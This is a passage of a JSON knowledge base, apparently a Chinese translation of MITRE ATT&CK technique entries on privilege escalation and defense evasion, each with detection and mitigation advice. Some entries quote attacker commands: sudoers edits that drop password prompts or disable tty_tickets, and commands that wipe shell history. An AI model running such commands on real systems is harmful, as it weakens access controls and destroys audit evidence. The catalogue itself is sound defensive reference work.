	},
	"name": "以提示用户输入凭据的方式升级权限"
}, {
	"id": "T1068",
	"description": "<p>当攻击者利用程序、服务或操作系统软件或内核本身中的编程错误执行代码时，就会发生软件漏洞攻击。权限级别等安全结构通常会阻碍信息的访问和某些技术的使用，因此攻击者可能需要提升权限后使用软件攻击来规避这些限制。</p><p>最初获得系统的访问权限时，攻击者可能正在较低权限的进程中操作，这会阻止他们访问系统上的某些资源。漏洞通常可能存在于操作系统组件和常常以更高权限运行的软件中。攻击者可能会利用这些漏洞在系统上获得更高级别的访问权限。有些人可能会因此从非特权或用户级权限升级到系统或root用户权限，具体取决于易受攻击的模块。这可能是攻击者破坏已正确配置的端点系统的必要步骤，限制了其他权限提升方法。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["Windows错误上报", "进程监控", "认证日志"]
	},
	"relations": {
		"detection": "<p>软件利用检测可能很困难，具体取决于可用的工具。软件攻击可能并不会总是成功，或者可能导致被攻击的进程变得不稳定或崩溃。还要在端点系统上查找能表明攻击成功的行为，例如浏进程的异常行为，包括写入磁盘的可疑文件，通过进程插入来试图掩盖执行的证据，以及发现的证据。</p><p>通常需要更高的权限来执行其他操作，例如凭据转储的某些操作。查找可能表示攻击者获得了更高权限的其他活动。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "使用沙箱来阻止攻击者利用未发现或未修补的漏洞来实施攻击操作。也可通过其他类型的虚拟化和应用微分段来减轻某些类型漏洞攻击的影响。但在这些系统中仍可能存在其他漏洞和缺陷攻击风险。"
		}, {
			"name": "漏洞利用防护",
			"description": "可以使用安全应用程序，例如WDEG（Windows Defender Exploit Guard）和EMET（Enhanced Mitigation Experience Toolkit），来检测攻击行为，从而缓解某些攻击行为的影响。也可通过控制流完整性检查来识别和阻止软件攻击。许多保护措施依赖于体系结构和目标应用二进制文件的兼容性，可能不适用于针对权限提升的软件组件。"
		}, {
			"name": "威胁情报计划",
			"description": "开发一个强大的网络威胁情报能力，用来确定哪些类型和级别的威胁可能会针对特定组织实施软件攻击和零日漏洞攻击。"
		}, {
			"name": "软件更新",
			"description": "对内部企业端点和服务器通过补丁管理来定期更新软件。"
		}],
		"tactics": ["TA0004"]
	},
	"name": "提权利用"
}, {
	"id": "T1181",
	"description": "<p>在创建窗口之前，基于 Windows 的图形进程必须规定或注册一个窗口类，该类规定外观和行为（通过 windows 过程，这是处理数据输入/输出的函数）。新 windows 类的注册可以包括请求将最多 40 字节的额外窗口内存（EWM） 追加到该类的每个实例的分配内存中。此 EWM 用于存储特定于该窗口的数据，并且具有特定的应用程序编程接口（API） 函数来设置和获取其值。</p><p>EWM 虽然很小，但足够存储 32 位指针，通常用于指向窗口过程。恶意软件可能在攻击链的一部分中利用此内存位置，包括将代码写入进程内存的共享部分，在EWM中放置指向代码的指针，然后通过将执行控制返回到进程的EWM中的地址来调用执行。</p><p>通过 EWM 注入授予的执行可能在单独的实时进程的地址空间中进行。与进程注入类似，这可以允许访问目标进程的内存和可能提升的权限。将有效负载写入共享部分还避免使用高度监视的 API 调用，如写入过程内存和创建远程线程。更复杂的恶意软件样本还可能通过触发窗口过程和其他系统功能的组合来绕过保护机制，例如数据执行保护（DEP），这些功能将重写目标进程的可执行部分内的恶意负载。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控与枚举和操作 EWM 相关的 API 调用，如 GetWindowLong 和 SetWindowLong 。与此技术关联的恶意软件还使用 SendNotifyMessage 来触发关联的窗口过程和最终的恶意注入。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005", "TA0004"]
	},
	"name": "EWM注入"
}, {
	"id": "T1502",
	"description": "<p>攻击者可能会伪造新进程的父进程标识符（PPID）来躲避进程监控防御或提升权限。除非明确指定，新进程通常直接从其父进程或调用进程中生成。可通过调用CreateProcess API来明确分配新进程的PPID。该API定义了要使用的PPID参数。Windows特性，例如用户账户控制（UAC），使用此功能来在SYSTEM（通过svchost.exe或consent.exe）而不是当前用户上下文生成提升进程后正确设置PPID。</p><p>攻击者可能会滥用这些机制来逃避防御（例如逃避那些阻止进程直接从Office文档生成的防御）或是来逃避针对异常/潜在恶意父子进程关系的分析（比如，将PowerShell/Rundll32的PPID伪造成explorer.exe，而不是鱼叉式钓鱼附件中的Office文档）。此技术可以通过恶意Office文档中的VBA脚本或任何可以通过API执行的代码来执行。</p><p>明确分配PPID还可能会导致权限升级（对父进程有适当访问权限）。例如，特权用户（如：管理员）上下文中的攻击者可能会生成一个新进程，并将父进程设置成SYSTEMF运行进程（如：lsass.exe），从而使用所获访问令牌来为新进程提升权限。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["Windows事件日志", "进程监控", "API监控"]
	},
	"relations": {
		"detection": "<p>查找存储PPID信息的各个字段之间的不一致，例如通过Windows事件跟踪（ETW）收集的数据中的EventHeader ProcessId字段，Windows事件日志中的Creator Process ID/Name字段，以及ProcessID和ParentProcessID字段（它们也由ETW和其他实用程序生成，例如任务管理器和进程管理器）。ETW提供的EventHeader ProcessId字段标识了实际的父进程。</p><p>监控和分析对<code>CreateProcess</code>/<code>CreateProcessA</code> API的调用，特别是调用方为用户/潜在恶意进程并且API中有明确定义PPID的参数（例如：进程创建标志0x8XXX，表示正在使用扩展的启动信息来创建进程）。对<code>CreateProcess</code>/<code>CreateProcessA</code>的恶意使用也可能通过调用<code>UpdateProcThreadAttribute</code>来进行，这可能是更新进程创建属性所必须的。可能会有对正常UAC提升行为的误报。因此，如果可能，请与系统基线以及正常系统活动进行比较。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005", "TA0004"]
	},
	"name": "伪造父进程PID"
}, {
	"id": "T1055",
	"description": "<p>进程注入是在单独的活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码可能会导致允许访问该进程的内存、系统/网络资源以及可能导致权限提升。通过进程注入执行代码还可以逃避安全产品的检测，因为代码执行是用合法进程隐藏的。</p><p>Windows</p><p>将代码注入活动的进程有多种实现方法。Windows系统中有如下实现方法：</p><p>·         动态链接库注入涉及将恶意动态链接库路径写入进程内，然后通过创建远程线程来调用执行。</p><p>·         可移植可执行注入涉及将恶意代码直接写入进程（磁盘上没有文件），然后通过这些额外代码或创建远程线程来调用执行。用注入的代码来置换原有的代码引入了其他功能需求：重新映射内存引用。这种方法的变体，如反射式动态链接库注入（将自映射动态链接库写入进程）和内存模块（写入进程时映射动态链接库），解决了地址重定位问题。</p><p>·         线程执行劫持涉及将恶意代码或动态链接库路径注入到进程的线程。与进程替换类似，线程必须先挂起。</p><p>·         APC（异步过程调用）注入涉及将恶意代码附加到进程线程的APC队列。排队的APC函数在线程进入可变状态时执行。APC注入的一个变体，“Early Bird注入”，涉及创建一个挂起的进程，该进程中的恶意代码可以在进程的入口点（以及随后可能会有的防恶意软件Hook）之前通过APC写入和执行。AtomBombing是另一种变体，它利用APC调用先前写入全局atom表的恶意代码。</p><p>·         TLS（线程本地存储）回调注入涉及操控PE文件中的指针，从而在到达代码的合法入口点之前将进程重定向到恶意代码。</p><p>Mac and Linux</p><p>Linux和OS X/MacOS系统中有如下实现方法：</p><p>·         可使用环境变量<b>LD_PRELOAD</b><b>，LD_LIBRARY_PATH</b>（linux）、<b>DYLD_INSERT_LIBRARIES</b>（Mac OS X）或dlfcn API在进程中动态加载库（共享对象），拦截运行中进程的API调用。</p><p>·         可通过Ptrace系统调用将代码附加到正在运行的进程并在运行时对其修改。</p><p>·         可使用/proc/[pid]/mem来获得进程内存访问权限，读取/写入任意数据。由于其复杂性，这种技术非常罕见。</p><p>·         使用VDSO劫持技术，通过操控从linux-vdso.so共享对象映射进来的代码存根，在ELF二进制文件运行时执行注入。</p><p>恶意软件通常利用进程注入来访问系统资源，通过这些资源获得持久性和其他环境修改。更复杂的样本可以使用命名管道或其他进程间通信（ipc）机制作为通信信道来执行多个进程注入，从而对模块进行分区并进一步规避检测。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "系统", "root"],
		"dataSources": ["API监控", "Windows注册表", "文件监控", "动态链接库监控", "进程监控", "命名管道"]
	},
	"relations": {
		"detection": "<p>监控各种类型代码注入的Windows API调用可能会生成大量数据而且可能无法直接用于防御，除非是在特定情况下为已知的错误调用序列收集数据。因为API函数的使用往往是善意的，很难与恶意行为区分开来。注入过程中可能会调用CreateRemoteThread、SuspendThread/SetThreadContext/ResumeThread、QueueUserAPC/NtQueueApcThread等API，也会调用WriteProcessMemory等API来修改其它进程的内存。</p><p>由于特殊性，监控Linux系统下的调用，如ptrace系统调用、环境变量LD_PRELOAD的使用，或dlfcn动态链接API调用，应该不会生成大量数据。这种监控可以很有效地检测某些常见进程注入。</p><p>监控命名管道创建和连接事件（事件17和18），获取外部模块感染进程的指示信息。</p><p>监控进程和命令行参数来检测代码注入前后可能执行的操作，并将检测到的信息与相关事件信息关联起来。攻击者也可能使用PowerSploit等工具通过PowerShell来执行代码注入。因此可能还需要监控PowerShell来检测这种注入行为。</p>",
		"mitigations": [{
			"name": "端点上的行为预防",
			"description": "可以配置某些端点安全解决方案，使其基于注入过程中发生行为的常见序列来阻止某些类型的进程注入。"
		}, {
			"name": "特权账号管理",
			"description": "Linux系统中，利用Yama来减少基于ptrace的进程注入，方法是将ptrace的使用仅限于特权用户。也可以使用其他缓解措施，比如部署安全内核模块来提供高级访问控制和进程限制，如SELinux、grsecurity和AppAmour。"
		}],
		"tactics": ["TA0005", "TA0004"]
	},
	"name": "进程注入"
}, {
	"id": "T1178",
	"description": "<p>Windows 安全标识符（SID） 是标识用户或组帐户的唯一值。Windows 安全在安全描述符和访问令牌中使用 SID。帐户可以在 SID 历史记录活动目录属性中保留其他 SID，允许域之间可操作的帐户迁移（例如，SID 历史记录中的所有值都包含在访问令牌中）。</p><p>攻击者可能使用此机制进行权限升级。使用域管理员（或等效）权限时，可以将已收集或已知的 SID 值插入到 SID 历史记录中，以便模拟任意用户/组（如企业管理员）。此操作可能导致对本地资源的访问提升和/或通过诸如远程服务，Windows管理员共享或Windows远程管理之类的横向移动技术访问其他不可访问的域。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "认证日志", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>使用 PowerShell Get-ADUser Cmdlet检查用户 SID 历史记录属性中的数据，尤其是具有来自同一域的 SID 历史记录值的用户。</p><p>监控域控制器上的帐户管理事件，以便成功和失败地更改 SID 历史记录。</p><p>监控对 <code>DsAddSidHistory</code>函数的Windows API调用。</p>",
		"mitigations": [{
			"name": "活动目录配置",
			"description": "合法帐户迁移完成后，清理 SID 历史记录属性。请考虑将 SID 筛选应用于林间信任（如林信任和外部信任），以从访问域资源的请求中排除 SID 历史记录。SID 筛选可确保信任上的任何身份验证请求仅包含来自受信任域的安全主体的 SID（即防止受信任域声明用户在域外的组中具有成员资格）。默认情况下启用林信任的 SID 筛选，但在某些情况下可能已禁用，以允许子域通过传输访问林信任。使用 Server 2003 或更高版本的域控制器，在所有创建的外部信任上自动启用外部信任的 SID 筛选。但是请注意，SID 筛选不会自动应用于旧版信任，或者可能已被故意禁用以允许域间访问资源。SID 筛选可以应用：使用网络工具（在域控制器上：netdom trust /domain: /EnableSIDHistory:no）。使用网络工具对外部信任应用 SID 筛选器隔离（在域控制器上：netdom trust/domain:/quarantine:yes）* 不建议对单个林中的域信任应用 SID 筛选，因为它是不受支持的配置，并可能导致重大更改。如果林中的域不可信，则它不应是林的成员。在此情况下，必须首先将受信任的和不受信任的域拆分为单独的林，其中 SID 筛选可应用于林间信任。"
		}],
		"tactics": ["TA0004"]
	},
	"name": "SID-History 注入"
}, {
	"id": "T1169",
	"description": "<p>/etc/sudoers文件描述了哪些用户可以运行哪些命令以及从哪些终端运行命令。文件还描述了用户可以作为其他用户或组运行哪些命令。这涉及到了最小权限的概念，即用户在大多数时间内都以尽可能低的权限运行，只在需要时通过提示输入密码提升到其他用户或权限。然而，攻击者还是可以在sudoers文件中编辑类似user1 all=（all）nopasswd:all这样的内容来指定何时不提示用户输入密码。</p><p>攻击者可能会利用sudoers文件中这些配置来以其他用户身份执行命令，或以更高权限来生成进程。但前提是攻击者必须有足够的权限来编辑此文件。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控"]
	},
	"relations": {
		"detection": "<p>Linux系统中，auditd会在每次发现用户实际ID和有效ID不一致时发出警报。（Sudo操作中会出现这种不一致。）</p>",
		"mitigations": [{
			"name": "特权账号管理",
			"description": "设置密码。即使攻击者可以获得终端访问权限，他们也必须获得sudoers文件中用来运行内容的密码。"
		}, {
			"name": "文件和目录权限限制",
			"description": "严格编辑sudoers文件。必须始终要有密码，而且用户不能以具有更高权限的用户身份生成风险进程。"
		}],
		"tactics": ["TA0004"]
	},
	"name": "Sudo命令"
}, {
	"id": "T1206",
	"description": "<p><code>sudo</code>命令\"允许系统管理员委派权限，以赋予某些用户（或用户组）以root用户或其他用户身份运行某些（或全部）命令的能力，同时提供命令及其参数的审核跟踪。由于sudo是为系统管理员制作的，因此它具有一些有用的配置功能，例如<code>timestamp_timeout</code>，它是sudo实例之间的时长（以分钟为单位）。超时之后，会重新提示输入密码。这是因为<code>sudo</code>能够缓存一段时间的凭据。Sudo在<code>/var/db/sudo</code>下创建（或触摸）一个文件，其时间戳为上次运行sudo的时间，以确定此超时时长。此外，还有一个<code>tty_ticket</code>变量，用于单独处理每个新tty（终端会话）。这意味着，例如，一个tty的sudo超时不会影响另一个tty（您必须再次键入密码）。</p><p>攻击者可能会滥用不当配置来升级权限，而无需用户密码。他们会监控/var/db/sudo时间戳来判断其是否位于<code>timestamp_timeout</code>范围内。如果是，则恶意软件可以执行sudo命令，而无需提供用户密码。禁用tty_tickets后，攻击者可以从该用户的任何tty执行此操作。</p><p>OSX Proton恶意软件已通过发布<code>echo \\'Defaults !tty_tickets\\' &gt;&gt; /etc/sudoers</code>来禁用<code>tty_ticket</code><code>s</code>，使得脚本编写更加容易。为了反映此更改，Proton恶意软件还必须发布<code>killall Terminal</code>。从macOS Sierra开始，sudoers文件默认启用<code>tty_ticket</code><code>s</code>。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>此技术滥用macOS和Linux系统中的正常功能，但sudo能够根据/etc/sudoers文件中的LOG_INPUT和LOG_OUTPUT指令记录所有输入和输出。</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "同样，确保启用tty_tickets设置将防止在tty会话之间发生泄漏。"
		}, {
			"name": "特权账户管理",
			"description": "将timestamp_timeout设置为0将要求用户在每次执行sudo时输入密码。"
		}],
		"tactics": ["TA0004"]
	},
	"name": "Sudo缓存"
}, {
	"id": "T1527",
	"description": "<p>攻击者可能会使用应用程序访问令牌来绕过典型的身份认证进程，并访问远程系统上的受限账户，信息或服务。这些令牌通常是从用户那里盗取的，用作登录凭据。</p><p>应用程序访问令牌用于代表用户发出授权API请求，并且通常用作访问云化应用程序资源以及软件即服务（SaaS）资源的一种方式。OAuth是一个常用的实现框架，它给用户发放系统访问令牌。这些框架可共同用于认证用户并确定允许用户执行的操作。一旦建立了身份，令牌就允许对操作进行授权，而无需传递用户的实际凭据。因此，令牌泄露会给攻击者以使用恶意应用程序获得其它站点资源的访问权限。</p><p>例如：假设使用的是云化电子邮件服务。一旦OAuth访问令牌授予给恶意应用程序并且后台访问的“刷新”令牌也授予了，就有可能获取对用户账户功能的长期访问。借助OAuth访问令牌，攻击者可以使用用户授予权限的REST API来执行诸如邮件搜索和联系人枚举之类的功能。</p><p>盗取访问令牌可能会是入侵其他服务的第一步。例如，如果某令牌授予重要邮件的访问权限，则攻击者就有可能通过触发忘记密码的例行操作将访问权限拓展到目标用户订阅的所有其他服务。通过令牌直接API访问会否定第二身份认证因素的有效性，并且可能不受诸如更改密码之类的直观对策的影响。由于访问仍然可以与合法的工作流程保持对齐，因此即使从服务提供商端也很难检测到通过API通道进行的访问滥用。</p>",
	"details": {
		"platform": ["SaaS", "Office 365"],
		"permissionRequired": ["用户"],
		"dataSources": ["OAuth审核日志", "Office 365账户日志"]
	},
	"relations": {
		"detection": "<p>监控访问令牌活动，查看是否有异常使用情况以及是否有对异常、可疑应用程序授予权限的情况。管理员可以设置各种日志并利用审核工具来监控OAuth 2.0访问导致的操作。例如，管理员可以通过审核报告识别诸如角色创建以及策略修改之类的权限提升操作（可能是在初始访问之后执行的操作）。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "管理员可以设置各种日志，并利用审核工具来监控OAuth 2.0访问导致的操作。例如，管理员可以通过审核报告识别诸如角色创建以及策略修改之类的权限提升操作（可能是在初始访问之后执行的操作）"
		}, {
			"name": "敏感信息加密",
			"description": "应该对包含敏感信息的邮件通信进行文件加密，否则很可能会被攻击者通过访问邮件服务获得。"
		}, {
			"name": "Web内容限制",
			"description": "更新公司政策，限制可将哪些类型的第三方应用程序添加到公司信息、账户或网络所链接的任何在线服务或工具（利如：Google，Microsoft，Dropbox，Basecamp，GitHub）。但是，与其就此提供高级别的指导，不如非常具体地列出预先核准的应用程序列表并且拒绝所有未列入清单的应用程序。管理员还可以通过管理门户（如Azure门户）阻止最终用户的许可操作，从而禁止用户通过OAuth授权第三方应用程序及强制管理许可。 "
		}],
		"tactics": ["TA0005", "TA0008"]
	},
	"name": "应用程序访问令牌"
}, {
	"id": "T1009",
	"description": "<p>攻击者可能会通过二进制填充来添加垃圾数据并更改恶意软件的磁盘上表现形式，而不会影响二进制文件的功能或行为。这通常会增加二进制文件的大小，导致文件超出大小限制，超出某些安全工具能够处理的范围。</p><p>二进制填充可以有效更改文件校验和，也可以用于避免基于哈希的黑名单以及静态杀毒签名。所使用的填充通常由创建垃圾数据的函数生成，然后附加到末尾或应用到恶意软件的各个部分。增加文件大小可能会降低非设计或配置为扫描大型大文件的某些工具和检测功能的有效性。这也可能会减少收集分析的可能性。公共文件扫描服务，比如VirusTotal，限制了待分析的上传文件的最大大小。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["二进制文件元数据", "文件监控", "恶意代码逆向工程"]
	},
	"relations": {
		"detection": "<p>根据文件填充方法，基于文件的签名可能能够通过扫描或基于访问的工具来检测文件填充行为。</p><p>执行时，填充文件生成的进程也可能表现出入侵行为的其他特征，例如系统和网络信息发现或横向移动，这些特征可用来指向源文件。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "二进制填充"
}, {
	"id": "T1146",
	"description": "<p>MacOS和Linux都会跟踪用户在终端中键入的命令，这样用户就可以很容易记住他们所做的事情。这些日志可以通过几种不同的方式访问。登录后，此命令历史在环境变量<code>HISTFILE</code>指向的文件中跟踪。用户退出系统时，此信息将刷新到用户家目录<code>~/.bash_history</code>下的文件中。这样做的好处是，用户可以返回到以前在不同会话中使用过的命令。命令行中键入的所有内容都被保存。同样地，在命令行中传入的密码也会被保存。攻击者可能会在这些文件中搜索明文密码来实施攻击。此外，攻击者可能会想方设法来防止自己使用的命令出现在这些日志中，例如<code>unset HISTFILE</code>,<code>export HISTFILESIZE=0</code>,<code>history-c</code>,<code>rm ~/.bash_history</code>。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["认证日志", "文件监控"]
	},
	"relations": {
		"detection": "<p>用户身份认证时，尤其是通过SSH这样的远程终端服务来做身份认证时，用户的<code>~/.bash_history</code>目录里没有新条目是可疑的。此外，修改环境变量HISTFILE和HISTFILESIZE或删除/清除<code>~/.bash_history</code>文件都可能表示有可疑活动发生。</p>",
		"mitigations": [{
			"name": "环境变量权限",
			"description": "将关联的环境变量设置为只读可以确保保留历史记录。"
		}, {
			"name": "文件和目录权限限制",
			"description": "阻止用户删除或写入某些文件，防止攻击者恶意更改他们的 ~/.bash_history 文件。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "清除命令历史"
}, {
	"id": "T1116",
	"description": "<p>代码签名给开发人员的二进制文件提供了真实性级别，它是二进制文件未被篡改的保证。然而，众所周知，攻击者会使用代码签名证书将恶意软件和工具伪装为合法的二进制文件。操作中使用的证书可能是由攻击者制作、伪造或窃取的。时下的Windows和MacOS/OS X系统可以在软件首次运行时验证其代码签名。由于平台的分散性特征，Linux系统没有此功能。</p><p>代码签名证书可用于绕过要求在系统上执行签名代码的安全策略。</p>",
	"details": {
		"platform": ["macOS", "Windows"],
		"dataSources": ["二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>收集并分析环境中执行的软件上的签名证书元数据，查找异常证书特征和异常值。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "代码签名"
}, {
	"id": "T1500",
	"description": "<p>攻击者可能会试图通过将文件作为未编译的代码交付给受害者，使得难以发现和分析有效负载。与模糊文件或信息类似，基于文本的源代码文件可能会破坏对保护可执行文件/二进制文件所做的分析和审查。这些负载需要在执行之前编译；通常通过本机实用程序来编译，如csc.exe或GCC/MinGW。</p><p>源代码有效负载也可以加密、编码和/或嵌入到其他文件中，例如鱼叉式钓鱼附件。有效负载也可能以无法识别的格式交付给本机操作系统（例如，macOS/Linux上的EXE），然后再通过捆绑的编译器以及执行框架（重新）编译为适当的可执行二进制文件。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程命令行参数", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>监控常见编译器（如csc.exe和GCC/MinGW）的执行文件路径和命令行参数，并与其他可疑行为相关联，以减少正常用户和管理员行为的误报。有效负载的编译还可生成文件创建和/或文件写入事件。查找非本机二进制格式和跨平台编译器及执行框架（如Mono），并确定它们在系统上是否有合法用途。通常，这些仅应在特定和有限的情况下使用，例如用于软件开发。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "交付后编译"
}, {
	"id": "T1207",
	"description": "<p>DCShadow是一种通过注册（或重用非活动注册）和模拟域控制器（DC）的行为来操纵活动目录（AD）数据（包括对象和架构）的方法。一旦注册，恶意DC可能就可以将更改注入并复制到任何域对象（包括凭据和密钥）的AD基础结构中。</p><p>注册恶意DC涉及在AD架构的配置分区中创建新服务器和nTDSDSA对象，这需要管理员权限（域或本地DC）或KRBTGT哈希。</p><p>此技术可能会绕过系统日志记录和安全监视器，例如安全信息和事件管理（SIEM）产品（因为对恶意DC执行的操作可能不会报告给这些感测器）。该技术还可用于更改和删除复制及其他关联的元数据，以阻碍取证分析。攻击者还可能会利用此技术执行SID-History注入和/或操纵AD对象（如帐户、访问控制列表、方案）来建立持久性后门。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
		"dataSources": ["API监控", "认证日志", "网络协议分析", "网络抓包"]
	},
	"relations": {
		"detection": "<p>监控和分析DC之间以及去往/来自非DC主机的数据复制（例如对DrsAddEntry，DrsReplicaAdd，尤其是GetNCChanges的调用）相关的网络流量。DC复制自然会每15分钟进行一次，但可以由攻击者或合法的紧急更改（例如：密码）触发。还要考虑监控和警告AD对象的复制（审核详细目录服务复制事件4928和4929）。</p><p>利用AD目录同步（DirSync）来监控使用AD复制cookie对目录状态所做的更改。</p><p>对AD架构的配置分区进行基线并定期分析，并在创建nTDSDSA对象时发出警报。</p><p>调查Kerberos服务主体名称（SPN）的使用情况，特别是那些与DC组织单位（OU）中不存在的计算机相关的服务（以“GC/”开头）。可以在不记录日志的情况下设置与目录复制服务（DRS）远程协议接口（GUID E3514235-4B06-11D1-AB04-00C04FC2DCD2）关联的SPN。恶意DC必须使用这两个SPN才能验证为服务，从而成功完成复制过程。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "DCShadow"
}, {
	"id": "T1140",
	"description": "<p>攻击者可能会使用模糊文件或信息来掩藏其入侵行为，躲避分析。他们可能需要单独的机制来解码或去除模糊信息，具体取决于他们打算如何使用这些信息。方法包括内置恶意软件、脚本、PowerShell，或者使用系统上的实用程序。</p><p>其中一个例子是使用certutil对隐藏在证书文件中的远程访问工具可移植可执行文件进行解码。</p><p>另一个例子是使用Windows <code>copy /b</code>命令将二进制片段重组为恶意负载。</p><p>负载可以压缩、存档或加密以避免被发现。在初始访问期间或之后，这些负载可与模糊文件或信息一起使用，以减少检测。有时，可能需要用户执行操作来打开文件才能去模糊化或解密。可能还会需要用户输入密码来打开攻击者提供的用密码保护的压缩/加密文件。攻击者也可能使用压缩或归档的脚本，比如Javascript。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>检测文件或信息的去模糊化或解码操作可能很困难，具体取决于实现。如果该功能包含在恶意软件中并使用Windows API，则在操作之前或之后尝试检测恶意行为可能会产生比尝试分析加载库或API调用更好的结果。如果使用了脚本，则可能需要收集脚本进行分析。监控进程和命令行来检测与脚本和系统实用程序（如certutil）相关的潜在恶意行为。</p><p>监控常见存档文件应用程序和扩展程序（如ZIP和RAR存档工具）的执行文件路径和命令行参数，并与其他可疑行为关联，从而减少正常用户和管理员行为的误报。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "文件或信息解混淆和解码"
}, {
	"id": "T1089",
	"description": "<p>攻击者可能会采用如下形式禁用安全工具来避免其工具和活动被检测到：杀死安全软件或事件日志进程、删除注册表项以使工具运行时不启动，或采用其他方法干扰安全扫描或事件报告。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["API监控", "文件监控", "服务", "Windows注册表", "进程命令行参数", "杀毒软件"]
	},
	"relations": {
		"detection": "<p>监控进程和命令行参数来查看安全工具是否已经终止或停止运行。监控注册表编辑来查看是否修改了安全工具对应的服务和启动程序。缺少日志或事件文件报告可能是可疑的。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "确保已经有适当的进程、注册表和文件权限，防止攻击者禁用或干扰安全服务。"
		}, {
			"name": "用户账号管理",
			"description": "确保已有适当的用户权限，防止攻击者禁用或干扰安全服务"
		}],
		"tactics": ["TA0005"]
	},
	"name": "禁用安全工具"
}, {
	"id": "T1073",
	"description": "<p>程序可能会指定运行时加载的动态链接库。如果程序错误地或含糊地指定了所需动态链接库，它可能会面临加载意外动态链接库的漏洞。附带加载漏洞尤其会在Windows并列（WinSxS）清单文件中的待加载动态链接库特征不够明显时发生。攻击者可能会利用易受附带加载漏洞攻击的合法程序来加载恶意动态链接库。</p><p>攻击者可能会使用这种技术来掩盖他们在合法、可信的系统或软件进程中执行的操作。</p>",
	"details": {
		"platform": ["Windows"],
		"dataSources": ["网络进程使用", "进程监控", "已加载动态链接库"]
	},
	"relations": {
		"detection": "<p>监控进程的异常活动（例如，不使用网络的进程开始这使用网络）。跟踪动态链接库元数据（比如哈希），将进程执行时加载的动态链接库与以前的执行进行比较，检测与打补丁或软件更新无关的活动。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "使用Windows附带的sxstrace.exe程序以及手动方式来检查清单文件是否存在软件附带加载漏洞。"
		}, {
			"name": "文件和目录权限限制",
			"description": "在写保护位置安装软件。"
		}, {
			"name": "软件更新",
			"description": "定期更新软件，包括安装动态链接库附带加载漏洞的修复补丁。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "DLL侧载"
}, {
	"id": "T1480",
	"description": "<p>执行护栏会根据预期在目标上存在的攻击者提供的环境特定条件来约束执行或动作。</p><p>护栏确保仅针对预期目标执行有效负载，并减少攻击者活动附带的损害。攻击者可以提供的有关用作护栏的目标系统或环境的值可能包括特定的网络共享名称、附加的物理设备、文件、加入的活动目录（AD）域及本地/外部IP地址。</p><p>环境密钥是一种类型的护栏，包括用于从给定计算环境中的特定类型的值得到加密/解密密钥的密码技术。值可以从目标特定的元素中得出，并用于为加密的有效负载生成解密密钥。目标特定值可以从特定网络共享、物理设备、软件/软件版本、文件、已加入的AD域、系统时间及本地/外部IP地址生成。通过根据目标特定的环境值生成解密密钥，环境密钥设置会使沙盒检测、杀毒软件检测、信息众包和逆向工程变得困难。这些困难会减慢事件响应过程，并帮助攻击者隐藏其战术、技术和过程（TTP）。</p><p>与模糊文件或信息类似，攻击者可能会使用护栏和环境密钥来帮助保护其TTP和逃避检测。例如，利用环境密钥技术向目标传递加密的有效负载，该目标将使用目标特定值在执行之前解密有效负载。通过使用目标特定值解密有效负载，攻击者可以避免将解密密钥打包到有效负载中，或者通过可能受监控的网络连接发送。根据收集目标特定值的技术，对加密有效负载进行反向工程可能会异常困难。通常，护栏可用于防止在不希望受到破坏或操纵的环境中暴露能力。护栏的这种使用不同于典型的虚拟化/沙箱逃避，在后者中可以做出不进一步参与的决定，因为攻击者指定的值条件是针对特定目标